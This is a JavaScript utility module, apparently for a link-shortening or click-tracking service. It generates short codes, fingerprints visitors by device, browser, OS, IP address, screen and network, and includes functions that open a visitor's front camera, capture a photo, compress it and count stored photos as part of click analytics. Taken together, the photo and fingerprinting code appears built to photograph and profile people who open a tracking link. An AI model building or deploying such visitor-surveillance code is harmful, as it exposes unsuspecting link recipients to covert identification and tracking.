export function generateShortCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

export function getDeviceInfo(userAgent) {
  const ua = userAgent.toLowerCase();
  
  // Device detection
  let device = 'Desktop';
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
    device = "Tablet";
  } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
    device = "Mobile";
  }
  
  // Browser detection
  let browser = 'Unknown';
  if (ua.includes('chrome')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edge')) browser = 'Edge';
  else if (ua.includes('opera')) browser = 'Opera';
  
  // OS detection
  let os = 'Unknown';
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';
  
  // Vendor detection
  let vendor = 'Unknown';
  if (ua.includes('apple')) vendor = 'Apple';
  else if (ua.includes('samsung')) vendor = 'Samsung';
  else if (ua.includes('google')) vendor = 'Google';
  else if (ua.includes('microsoft')) vendor = 'Microsoft';
  else if (ua.includes('xiaomi')) vendor = 'Xiaomi';
  else if (ua.includes('oneplus')) vendor = 'OnePlus';
  
  return { device, browser, os, vendor };
}

export function getClientIP(request) {
  const forwarded = request.headers.get('x-forwarded-for');
  const realIP = request.headers.get('x-real-ip');
  const cfConnectingIP = request.headers.get('cf-connecting-ip');
  
  if (cfConnectingIP) {
    return cfConnectingIP;
  }
  
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  
  if (realIP) {
    return realIP;
  }
  
  return 'Unknown';
}

export function getScreenInfo() {
  return {
    resolution: `${screen.width}x${screen.height}`,
    availableResolution: `${screen.availWidth}x${screen.availHeight}`,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth
  };
}

export function getConnectionInfo() {
  const connection = navigator.connection;
  if (connection) {
    return {
      effectiveType: connection.effectiveType,
      downlink: connection.downlink,
      rtt: connection.rtt,
      saveData: connection.saveData
    };
  }
  return null;
}

// ========== PHOTO-RELATED UTILITY FUNCTIONS ==========

/**
 * Check if browser supports camera access
 */
export function isCameraSupported() {
  return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
}

/**
 * Get camera capabilities and available devices
 */
export async function getCameraCapabilities() {
  try {
    if (!isCameraSupported()) {
      return { supported: false, devices: [] };
    }

    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    return {
      supported: true,
      devices: videoDevices.map(device => ({
        deviceId: device.deviceId,
        label: device.label || 'Unknown Camera',
        groupId: device.groupId
      })),
      hasFrontCamera: videoDevices.length > 0
    };
  } catch (error) {
    return { supported: false, error: error.message, devices: [] };
  }
}

/**
 * Capture photo from front camera
 */
export async function captureFrontCameraPhoto(quality = 0.8) {
  try {
    if (!isCameraSupported()) {
      throw new Error('Camera not supported in this browser');
    }

    // Request front camera
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user', // Front camera
        width: { ideal: 640 },
        height: { ideal: 480 }
      },
      audio: false
    });

    // Create video element
    const video = document.createElement('video');
    video.srcObject = stream;
    video.playsInline = true;

    // Wait for video to be ready
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        resolve(true);
      };
    });

    // Create canvas for capturing
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    if (!context) {
      throw new Error('Canvas context not available');
    }

    // Set canvas dimensions
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Wait for camera to stabilize
    await new Promise(resolve => setTimeout(resolve, 500));

    // Capture frame
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert to base64
    const photoData = canvas.toDataURL('image/jpeg', quality);

    // Clean up
    stream.getTracks().forEach(track => track.stop());
    video.remove();
    canvas.remove();

    return {
      success: true,
      data: photoData,
      width: canvas.width,
      height: canvas.height,
      size: Math.round(photoData.length * 0.75), // Approximate size in bytes
      timestamp: new Date().toISOString()
    };

  } catch (error) {
    return {
      success: false,
      error: error.message,
      data: null
    };
  }
}

/**
 * Compress base64 image to reduce size
 */
export function compressBase64Image(base64String, maxWidth = 800, quality = 0.7) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = function() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      // Calculate new dimensions
      let width = img.width;
      let height = img.height;

      if (width > maxWidth) {
        height = (height * maxWidth) / width;
        width = maxWidth;
      }

      canvas.width = width;
      canvas.height = height;

      // Draw and compress
      ctx.drawImage(img, 0, 0, width, height);
      const compressedBase64 = canvas.toDataURL('image/jpeg', quality);

      resolve({
        originalSize: Math.round(base64String.length * 0.75),
        compressedSize: Math.round(compressedBase64.length * 0.75),
        data: compressedBase64,
        width: width,
        height: height
      });
    };

    img.src = base64String;
  });
}

/**
 * Extract EXIF data from image (if available)
 */
export function getImageMetadata(base64String) {
  return {
    format: base64String.split(';')[0].split('/')[1] || 'jpeg',
    dataUrl: base64String.substring(0, 100) + '...', // Preview
    fullSize: base64String.length,
    estimatedSize: Math.round(base64String.length * 0.75)
  };
}

/**
 * Check if photo data is valid base64 image
 */
export function isValidPhotoData(photoData) {
  if (!photoData || typeof photoData !== 'string') return false;
  
  const base64Regex = /^data:image\/(jpeg|jpg|png|gif|webp);base64,/;
  return base64Regex.test(photoData);
}

/**
 * Get photo storage information
 */
export function getPhotoStorageInfo(analyticsData) {
  const photos = analyticsData.filter(item => item.photo && isValidPhotoData(item.photo));
  
  return {
    totalPhotos: photos.length,
    totalSize: photos.reduce((sum, item) => sum + (item.photoSize || 0), 0),
    averageSize: photos.length > 0 ? Math.round(photos.reduce((sum, item) => sum + (item.photoSize || 0), 0) / photos.length) : 0,
    withCameraAccess: analyticsData.filter(item => item.hasCamera).length,
    cameraDenied: analyticsData.filter(item => item.cameraStatus === 'failed').length
  };
}

/**
 * Format photo size for display
 */
export function formatPhotoSize(bytes) {
  if (bytes < 1024) return bytes + ' bytes';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / 1048576).toFixed(1) + ' MB';
}

/**
 * Camera permission status checker
 */
export async function checkCameraPermission() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const videoDevices = devices.filter(device => device.kind === 'videoinput');
    
    // If device has label, permission was granted previously
    const hasPermission = videoDevices.some(device => device.label);
    
    return {
      hasPermission,
      devicesCount: videoDevices.length,
      canAskPermission: !hasPermission && videoDevices.length > 0
    };
  } catch (error) {
    return {
      hasPermission: false,
      error: error.message
    };
  }
}